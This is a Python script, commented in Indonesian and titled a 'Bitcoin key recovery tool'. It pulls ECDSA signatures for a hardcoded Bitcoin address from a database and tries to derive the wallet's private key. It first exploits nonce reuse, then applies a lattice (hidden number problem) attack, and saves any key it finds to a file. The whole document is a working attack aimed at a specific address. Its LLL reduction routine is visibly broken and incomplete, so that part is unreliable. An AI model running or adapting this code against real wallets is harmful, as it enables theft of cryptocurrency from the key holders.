import sqlite3
import numpy as np
from fastecdsa.curve import secp256k1
from sympy import mod_inverse
import sys

# Konfigurasi Curve
CURVE_N = secp256k1.q

# ==========================================
# 1. PARSING DER (Sangat Penting)
# ==========================================
def extract_s_from_der(der_hex):
    try:
        if not der_hex or len(der_hex) < 10: return None
        der_hex = str(der_hex).strip()
        idx = 0
        if der_hex[idx:idx+2] != '30': return None
        idx += 4 # Skip 30 + Total Len
        if der_hex[idx:idx+2] != '02': return None
        idx += 2
        r_len = int(der_hex[idx:idx+2], 16)
        idx += 2 + (r_len * 2)
        if der_hex[idx:idx+2] != '02': return None
        idx += 2
        s_len = int(der_hex[idx:idx+2], 16)
        idx += 2
        s_hex = der_hex[idx : idx + (s_len * 2)]
        return int(s_hex, 16)
    except:
        return None

# ==========================================
# 2. SOLVER: NONCE REUSE (R SAMA) -> 100% SUCCESS RATE
# ==========================================
def solve_explicit_nonce_reuse(data):
    """
    Mencari dua signature yang menggunakan R sama persis.
    Rumus: k = (z1 - z2) / (s1 - s2)
    """
    print(f"\n[Mode 1] Memeriksa Explicit Nonce Reuse (R Duplicate)...")
    n = len(data)
    for i in range(n):
        for j in range(i + 1, n):
            sig1 = data[i]
            sig2 = data[j]
            
            # Jika R sama, TAPI S beda -> KITA MENANG!
            if sig1['r'] == sig2['r'] and sig1['s'] != sig2['s']:
                print(f"   ⚡ DITEMUKAN R COLLISION!")
                print(f"      Sig 1 ID: {i} | Z: {str(sig1['z'])[:10]}...")
                print(f"      Sig 2 ID: {j} | Z: {str(sig2['z'])[:10]}...")
                
                try:
                    # Hitung k (nonce)
                    # k = (z1 - z2) * (s1 - s2)^-1 mod N
                    diff_z = (sig1['z'] - sig2['z']) % CURVE_N
                    diff_s = (sig1['s'] - sig2['s']) % CURVE_N
                    inv_s = mod_inverse(diff_s, CURVE_N)
                    
                    k = (diff_z * inv_s) % CURVE_N
                    
                    # Hitung Private Key (d)
                    # d = (s1 * k - z1) * r^-1 mod N
                    inv_r = mod_inverse(sig1['r'], CURVE_N)
                    d = ( ((sig1['s'] * k) % CURVE_N) - sig1['z'] ) % CURVE_N
                    d = (d * inv_r) % CURVE_N
                    
                    return hex(d)
                except Exception as e:
                    print(f"      Error math: {e}")
                    continue
    print("   ❌ Tidak ditemukan R yang sama persis.")
    return None

# ==========================================
# 3. SOLVER: LATTICE (HNP)
# ==========================================
def lll_reduction(basis):
    """LLL Sederhana (Slow but Pure Python)"""
    dim = basis.shape[0]
    mu = np.zeros((dim, dim))
    b_star = np.zeros((dim, dim), dtype=object) # Object untuk presisi tinggi
    
    for i in range(dim):
        b_star[i] = basis[i].copy()
        for j in range(i):
            # Proyeksi (Float)
            num = float(np.dot(basis[i], b_star[j]))
            den = float(np.dot(b_star[j], b_star[j]))
            mu[i, j] = num / den if den != 0 else 0
            b_star[i] = b_star[i] - (basis[i] * 0) 
            
            sub = int(round(mu[i, j]))
            if sub != 0:
                basis[i] -= sub * basis[j]
    return basis

def solve_hnp_lattice(data, leaked_bits):
    n_sigs = len(data)
    # HNP Rule: Kita butuh m * bits > 256. 
    # Jika cuma 15 sigs, bits MINIMAL harus 18.
    if n_sigs * leaked_bits < 260:
        print(f"   ⚠️ SKIP: {n_sigs} sigs tidak cukup untuk leak {leaked_bits} bits (Butuh min {int(260/leaked_bits)} sigs)")
        return None

    # Asumsi: Nonce Kecil (MSB Leak) -> k < B
    B = 2**(256 - leaked_bits)
    
    # Matriks Identitas + Kolom HNP
    # Struktur Matriks CVP Embedding
    # [ q  0  0 ... 0  0 ]
    # [ 0  q  0 ... 0  0 ]
    # ...
    # [ t1 t2 ... 1  0 ]
    # [ u1 u2 ... 0  B ]
    
    matrix = np.zeros((n_sigs + 2, n_sigs + 2), dtype=object)
    
    print(f"   🔄 Membangun Lattice {n_sigs}x{n_sigs} (Leak {leaked_bits})...")
    
    for i in range(n_sigs):
        try:
            r = data[i]['r']
            s = data[i]['s']
            z = data[i]['z']
            
            s_inv = mod_inverse(s, CURVE_N)
            t = (r * s_inv) % CURVE_N
            u = (z * s_inv) % CURVE_N
            
            # Diagonal q
            matrix[i, i] = CURVE_N
            
            # Baris koefisien t (baris ke-n)
            matrix[n_sigs, i] = t
            
            # Baris koefisien u (baris ke-n+1)
            matrix[n_sigs + 1, i] = u
            
        except: return None

    # Weighting factors
    matrix[n_sigs, n_sigs] = 1 # Kappa
    matrix[n_sigs + 1, n_sigs + 1] = B # Scaling factor
    
    print("   ⚙️ Menjalankan LLL (Mohon tunggu)...")
    reduced = lll_reduction(matrix)
    
    # Cek baris untuk kandidat Key
    for row in reduced:
        # Kandidat private key biasanya muncul sebagai koefisien dari t
        # d = row[n] % q (kadang perlu disesuaikan tanda +/-)
        potentials = [
            abs(int(row[n_sigs])) % CURVE_N,
            (CURVE_N - abs(int(row[n_sigs]))) % CURVE_N
        ]
        
        for d_cand in potentials:
            if 1 < d_cand < CURVE_N:
                # Verifikasi sederhana: Cek terhadap signature pertama
                # PubKey = d * G (Terlalu berat hitung di sini, kita cek matematis s aja)
                
                # Test: s * k = z + r * d  ==> k = (z + r*d)/s
                # Jika k hasil hitungan ini "kecil" (< B), kemungkinan besar benar
                r0 = data[0]['r']
                s0 = data[0]['s']
                z0 = data[0]['z']
                
                val = (z0 + r0 * d_cand) % CURVE_N
                s_inv0 = mod_inverse(s0, CURVE_N)
                k_check = (val * s_inv0) % CURVE_N
                
                # Jika k "kecil" (sesuai asumsi leak), kita ketemu!
                if k_check < B * 100: # Margin toleransi
                    return hex(d_cand)
    return None

# ==========================================
# MAIN
# ==========================================
def get_data(db_path, address):
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()
    # Cek kolom
    try:
        cur.execute("SELECT r, s, z, sig_hex FROM signatures WHERE address=?", (address,))
    except:
        cur.execute("SELECT r, s, z, s FROM signatures WHERE address=?", (address,))
    
    rows = cur.fetchall()
    conn.close()
    
    clean_data = []
    for r, s, z, sig_hex in rows:
        try:
            val_r = int(str(r), 16) if 'x' in str(r) else int(r)
            val_z = int(str(z), 16) if 'x' in str(z) else int(z)
            
            # Recovery S
            val_s = None
            if sig_hex and len(str(sig_hex)) > 10:
                val_s = extract_s_from_der(sig_hex)
            if not val_s:
                val_s = int(str(s), 16) if 'x' in str(s) else int(s)
            
            if val_r > 0 and val_s > 0:
                clean_data.append({'r': val_r, 's': val_s, 'z': val_z})
        except: continue
    return clean_data

if __name__ == "__main__":
    DB = "valid_nonce_reuse.db"
    ADDR = "1KKhHFjERpq7fPYRDp66FdD6Bk1fRfXkMi"
    
    print(f"--- BITCOIN KEY RECOVERY TOOL ---")
    print(f"Target: {ADDR}")
    
    sigs = get_data(DB, ADDR)
    print(f"Data Loaded: {len(sigs)} signatures.")
    
    if len(sigs) < 2:
        print("❌ Kurang data (Minimal 2).")
        exit()
        
    # LANGKAH 1: Cek Nonce Reuse (Paling Cepat & Akurat)
    priv = solve_explicit_nonce_reuse(sigs)
    
    # LANGKAH 2: Jika Gagal, Coba Lattice (Hanya jika data cukup)
    if not priv:
        print("\n[Mode 2] Mencoba Lattice Attack (HNP)...")
        # Kita hanya mencoba leak yang MASUK AKAL untuk 15 signatures
        # 15 * 20 = 300 bits > 256 (Bisa)
        # 15 * 10 = 150 bits < 256 (Mustahil secara matematis)
        
        # Coba leak besar (Weak RNG / MSB 0000...)
        for bits in [128, 64, 40, 32, 24]: 
            print(f"\n[?] Test Leak: {bits} bits (Asumsi Nonce Kecil)")
            priv = solve_hnp_lattice(sigs, bits)
            if priv: break
            
    if priv:
        print("\n" + "="*50)
        print("🎉 SUCCESS! PRIVATE KEY FOUND")
        print("="*50)
        print(f"HEX: {priv}")
        with open("PRIVATE_KEY_FOUND.txt", "w") as f:
            f.write(priv)
    else:
        print("\n❌ Gagal. Kemungkinan:")
        print("1. Data terlalu sedikit untuk Lattice (Butuh >50 sigs untuk leak kecil).")
        print("2. Tidak ada Nonce Reuse murni (R beda semua).")
        print("3. Posisi leak tidak di MSB (Bias di tengah/acak).")
